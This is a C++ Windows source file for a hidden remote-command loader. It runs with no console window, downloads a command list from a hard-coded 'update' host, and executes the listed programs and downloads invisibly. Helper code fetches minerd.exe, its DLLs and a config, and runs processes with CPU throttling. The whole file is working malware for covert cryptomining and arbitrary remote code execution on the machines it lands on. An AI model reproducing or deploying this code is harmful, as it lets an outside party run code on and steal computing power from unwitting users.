#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

#include <stdio.h>
#include <windows.h> 
#include <urlmon.h>
#include <string>
#include <atomic>
#include <fstream>

#include "util.h"

#pragma comment(lib, "urlmon.lib")

inline HRESULT download_url_to_file(const std::string& url, const std::string& file_name) {
	return URLDownloadToFileA( NULL, url.c_str(), file_name.c_str(), 0, NULL );
}

inline HRESULT download_file_from_url(const std::string& base_url, const std::string& file_name) {
	return URLDownloadToFileA( NULL, (base_url + file_name).c_str(), file_name.c_str(), 0, NULL );
}

void download_minerd_from_web(const std::string& base_url) {
	HRESULT hr = download_file_from_url(base_url, "config.json");
	hr = download_file_from_url(base_url, "libcurl-4.dll");
	hr = download_file_from_url(base_url, "minerd.exe");
	hr = download_file_from_url(base_url, "pthreadGC2.dll");
}

boolean execute_cmd(const std::string& exe, const std::string& cmd_line) {
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stderr;
	si.hStdOutput = stdout;
    ZeroMemory( &pi, sizeof(pi) );
	if( !CreateProcessA( (LPSTR)(exe.c_str()),   // No module name (use command line)
		(LPSTR)(cmd_line.c_str()),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        IDLE_PRIORITY_CLASS | CREATE_NO_WINDOW,              // Creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return false;
	}
	
	// Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
	return true;
}

boolean execute_cmd_with_throttle(const std::string& exe,
								  const std::string& cmd_line,
								  LPPROCESS_INFORMATION pi,
								  LPThrottleInfo ti,
								  LPHANDLE handle) {
	STARTUPINFOA si;
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stderr;
	si.hStdOutput = stdout;
    ZeroMemory( pi, sizeof(*pi) );
	if( !CreateProcessA( (LPSTR)(exe.c_str()),   // No module name (use command line)
		(LPSTR)(cmd_line.c_str()),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        IDLE_PRIORITY_CLASS | CREATE_NO_WINDOW,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        pi )           // Pointer to PROCESS_INFORMATION structure
    ) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return false;
	}

	ti->process_id = pi->dwProcessId;
	ti->should_stop = false;

	*handle = create_throttle_thread(ti);
	if (*handle == NULL) {
		return false;
	} else {
		return true;
	}
}

void wait_for_throttled_cmd(LPPROCESS_INFORMATION pi, LPThrottleInfo ti, LPHANDLE handle) {
	// Wait until child process exits.
    WaitForSingleObject(pi->hProcess, INFINITE);
	ti->should_stop = true;
	WaitForSingleObject(*handle, INFINITE);

    // Close process and thread handles.
    CloseHandle( pi->hProcess );
    CloseHandle( pi->hThread );
	CloseHandle(*handle);
}

void execute_cmd_list(const std::string& cmd_list_file) {
	std::ifstream ifs(cmd_list_file);
	if (!ifs.good()) return;
	std::string line;
	std::vector<std::string> tokens;
	while (std::getline(ifs, line)) {
		tokens.clear();
		
		// empty line
		if (line.size() == 0) continue;
		// comment
		if (line[0] == '#') continue;

		split(line, &tokens, ' ');
		if (tokens.size() == 0u) continue;

		// valid command
		printf("%s\n", line.c_str());

		if (tokens[0] == "exec" && tokens.size() > 1) {
			// execute a command
			std::string exe = tokens[1];
			std::string cmd_line;
			join(tokens, &cmd_line, " ", 1, tokens.size());
			if (!execute_cmd(exe, cmd_line)) break;
		} else if (tokens[0] == "download" && tokens.size() == 3) {
			// download a file
			std::string url = tokens[1];
			std::string file = tokens[2];
			if (S_OK != download_url_to_file(url, file)) break;
		} else if (tokens[0] == "throttle" && tokens.size() > 4) {
			// execute a command with throttle control
			std::string exe = tokens[4];
			std::string cmd_line;
			join(tokens, &cmd_line, " ", 4, tokens.size());
			PROCESS_INFORMATION pi;
			ThrottleInfo ti;
			ti.percentage = atoi(tokens[1].c_str());
			ti.throttle_time = atoi(tokens[2].c_str());
			ti.revisit_time = atoi(tokens[3].c_str());
			HANDLE handle;
			if (!execute_cmd_with_throttle(exe, cmd_line, &pi, &ti, &handle)) break;
			wait_for_throttled_cmd(&pi, &ti, &handle);
		}
	}
}

int main(int argc, char* argv[])
{
	boolean has_console = AttachConsole(ATTACH_PARENT_PROCESS);
	if (has_console) {
		// console
		printf("\n");
	}

	// cmd list
	download_file_from_url("http://update.xxsr.91waijiao.com/mockserver/", "cmd_list.txt");
	execute_cmd_list("cmd_list.txt");

	if (has_console) {
		FreeConsole();
	}
	return 0;
}